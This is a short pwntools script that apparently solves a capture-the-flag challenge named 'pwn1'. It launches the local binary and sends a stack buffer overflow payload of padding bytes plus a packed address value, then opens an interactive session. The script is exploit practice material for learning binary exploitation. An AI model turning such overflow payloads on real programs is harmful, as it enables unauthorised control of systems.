from pwn import *

p=process("./pwn1")
payload=(0x20-8)*'a'+p64(0x7F3)
p.recvline()
p.sendline(payload)
p.interactive()